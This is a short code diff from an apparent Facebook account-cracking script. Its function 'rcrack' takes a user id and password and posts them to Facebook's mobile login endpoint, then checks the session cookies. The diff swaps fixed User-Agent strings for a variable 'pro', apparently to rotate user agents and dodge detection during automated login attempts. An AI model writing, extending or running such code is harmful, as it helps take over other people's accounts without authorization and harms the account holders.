@@ -503,7 +503,7 @@ def rcrack(uid,pwx,tl):
 			
 			'upgrade-insecure-requests': '1',
 			
-			'User-Agent': 'Dalvik/2.1.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.136 Mobile Safari/537.36 OPR/63.3.3216.58675'}
+			'User-Agent': pro,}
 
 			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 
@@ -673,8 +673,8 @@ def rcrack(uid,pwx,tl):
            'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-            ',}
+            'user-agent': pro, }
+            
 			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 
 			log_cookies=session.cookies.get_dict().keys()
